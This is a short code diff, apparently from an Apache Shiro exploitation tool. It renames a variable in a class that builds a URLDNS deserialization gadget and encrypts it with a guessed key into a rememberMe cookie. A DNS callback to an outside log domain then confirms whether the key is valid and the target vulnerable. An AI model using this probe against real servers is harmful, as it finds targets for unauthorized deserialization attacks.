@@ -38,8 +38,8 @@ public class ShiroUrlDns {
     private void init(String key, String dnsLogUrl) throws Exception {
         String sendDnsLogUrl = key.substring(0, 1) + "." + this.randomStr(8) + "." + dnsLogUrl;
 
-        byte[] bytes = this.makeDNSURL(sendDnsLogUrl);
-        String rememberMe = this.shiroRememberMeEncrypt(key, bytes);
+        byte[] exp = this.makeDNSURL(sendDnsLogUrl);
+        String rememberMe = this.shiroRememberMeEncrypt(key, exp);
 
         this.setKey(key);
         this.setDnsLogUrl(dnsLogUrl);
@@ -114,8 +114,8 @@ public class ShiroUrlDns {
         Field codev = clazz.getDeclaredField("hashCode");
         codev.setAccessible(true);
         codev.set(u, -1);
-        byte[] bytes = getBytes(ht);
-        return bytes;
+        byte[] exp = getBytes(ht);
+        return exp;
     }
 
     private static byte[] getBytes(Object obj) throws IOException {
